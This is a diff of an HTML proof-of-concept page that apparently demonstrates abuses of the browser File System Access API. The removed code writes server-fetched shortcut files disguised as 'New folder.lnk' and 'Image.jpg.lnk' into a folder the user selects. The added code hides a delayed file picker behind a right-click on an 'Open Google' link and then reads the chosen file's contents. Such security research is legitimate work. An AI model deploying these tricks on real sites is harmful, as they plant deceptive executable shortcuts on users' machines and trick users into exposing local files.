@@ -1,53 +1,62 @@
-<!doctype html>
-<html lang="en">
 
-<head>
-    <meta charset="utf-8">
-    <title>File System Access API</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="icon" type="image/x-icon" href="favicon.png">
-</head>
-
+<!DOCTYPE html>
+<html>
 <body>
-    <h3>File System Access API save .lnk and .local</h3>
 
-    <div style="display: flex; flex-direction: row">
 
-        <div style="width: 50%">
-            <div>
-                <button id="butDirectory">Select a folder where to create a new folder and image.jpg</button>
-            </div>
-        </div>
+<a href="https://google.com"  oncontextmenu="	setTimeout(' openAndReadFile()',3200)" onclick="f()">Open Google</a><br/><br/><br/><br/>
 
-    </div>
-    <script>
-        let fileHandle;
-        const butDir = document.getElementById('butDirectory')
-        butDir.addEventListener('click', async () => {
-            //get a user system folder
-            const dirHandle = await window.showDirectoryPicker()
 
-            //create New Folder shortcut file in a user system folder
-            const newFileHandle = await dirHandle.getFileHandle('New folder.lnk', {
-                create: true
-            })
 
-            //write real lnk code to the file that we created
-            const writable = await newFileHandle.createWritable()
-            const response = await fetch('folder.lnk')
-            await response.body.pipeTo(writable)
+<img id="myImageElement" width="300px" height="300px">
+<script>
 
-            //create image.jpg shortcut file in a user system folder
-            const newFileHandleImage = await dirHandle.getFileHandle('Image.jpg.lnk', {
-                create: true
-            })
 
-            //write real lnk code to the file that we created
-            const writableForImage = await newFileHandleImage.createWritable()
-            const responseForImage = await fetch('lnkextra.lnk')
-            await responseForImage.body.pipeTo(writableForImage)
-        })
-    </script>
+
+
+async function openAndReadFile() {
+  try {
+    // Options for the file picker, allowing selection of image files
+    const pickerOpts = {
+      types: [
+        {
+          description: "Images",
+          accept: {
+            "image/*": [".png", ".gif", ".jpeg", ".jpg"],
+          },
+        },
+      ],
+      excludeAcceptAllOption: false, 
+      multiple: false, 
+    };
+
+   
+    const [fileHandle] = await window.showOpenFilePicker(pickerOpts);
+
+   
+    const file = await fileHandle.getFile();
+
+ 
+    const fileContent = await file.text(); 
+     
+    console.log("File Name:", file.name);
+    console.log("File Content:", fileContent);
+
+ 
+     const imageUrl = URL.createObjectURL(file);
+     document.getElementById('myImageElement').src = imageUrl;
+
+  } catch (error) {
+    if (error.name === 'AbortError') {
+      console.log('User cancelled the file picker.');
+    } else {
+      console.error('Error opening or reading file:', error);
+    }
+  }
+}
+
+
+</script>
+
 </body>
-
 </html>
